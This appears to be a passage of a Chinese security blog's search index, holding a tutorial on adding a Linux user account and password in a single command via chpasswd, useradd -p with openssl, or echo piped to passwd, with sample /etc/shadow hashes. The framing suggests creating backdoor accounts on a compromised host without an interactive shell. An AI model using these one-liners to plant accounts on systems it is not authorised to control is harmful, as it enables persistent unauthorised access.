+<p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html">https://www.cnblogs.com/LittleHann/p/12038070.html</a></p>
+<p><a href="https://www.anquanke.com/post/id/87017">https://www.anquanke.com/post/id/87017</a></p>
+<h1 id="一句话添加账号"><a href="#一句话添加账号" class="headerlink" title="一句话添加账号"></a><strong>一句话添加账号</strong></h1><p>你不是不给我提供交互的界面吗，那我就是使用脚本式的方法，使用一句话完成账号密码的添加，有关一句话账号密码的添加，笔者收集了以下几种方式。</p>
+<p><strong>3.1.1 chpasswd 方法</strong></p>
+<p><strong>（1）执行语句</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd newuser;echo &quot;newuser:password&quot;|chpasswd</span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）操作实例</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ifly-21171:~# useradd guest;echo &#x27;guest:123456&#x27;|chpasswd</span><br><span class="line">root@ifly-21171:~# vim /etc/shadow</span><br><span class="line"></span><br><span class="line">sshd:*:17255:0:99999:7:::</span><br><span class="line">pollinate:*:17255:0:99999:7:::</span><br><span class="line">postgres:*:17390:0:99999:7:::</span><br><span class="line">guest:$6$H0a/Nx.w$c2549uqXOULY4KvfCK6pTJQahhW7fuYYyHlo8HpnBxnUMtbXEbhgvFywwyPo5UsCbSUAMVvW9a7PsJB12TXPn.:17425:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.1.2 useradd -p 方法</strong></p>
+<p><strong>（1） 执行语句</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd -p encrypted_password newuser</span><br></pre></td></tr></table></figure>
+
+<p><strong>（2） 操作实例</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ifly-21171:~# useradd -p `openssl passwd 123456` guest</span><br><span class="line">root@ifly-21171:~# vim /etc/shadow</span><br><span class="line">sshd:*:17255:0:99999:7:::</span><br><span class="line">pollinate:*:17255:0:99999:7:::</span><br><span class="line">postgres:*:17390:0:99999:7:::</span><br><span class="line">guest:h8S5msqJLVTfo:17425:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p><strong>（3） 相同方法其他实现</strong></p>
+<p> 相同方法不同实现一</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ifly-21171:~# useradd -p &quot;$(openssl passwd 123456)&quot; guest</span><br><span class="line">root@ifly-21171:~#</span><br></pre></td></tr></table></figure>
+
+<p>相同方法不同实现二</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user_password=&quot;`openssl passwd 123456`&quot;</span><br><span class="line">useradd -p &quot;$user_password&quot; guest</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.1.3 echo -e 方法</strong></p>
+<p>（1）执行语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd newuwer;echo -e &quot;123456n123456n&quot; |passwd newuser</span><br></pre></td></tr></table></figure>
+
+<p>（2） 操作实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ifly-21171:~# useradd test;echo -e &quot;123456n123456n&quot; |passwd test</span><br><span class="line">Enter new UNIX password: Retype new UNIX password: passwd: password updated successfully</span><br><span class="line">root@ifly-21171:~# vim /etc/shadow</span><br><span class="line">sshd:*:17255:0:99999:7:::</span><br><span class="line">pollinate:*:17255:0:99999:7:::</span><br><span class="line">postgres:*:17390:0:99999:7:::</span><br><span class="line">guest:h/UnnFIjqKogw:17425:0:99999:7:::</span><br><span class="line">test:$6$rEjvwAb2$nJuZ1MDt0iKbW9nigp8g54ageiKBDuoLObLd1kWUC2FmLS0xCFFZmU4dzRtX/i2Ypm9uY6oKrSa9g</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>总结</tag>
+      </tags>
+  </entry>
+</search>
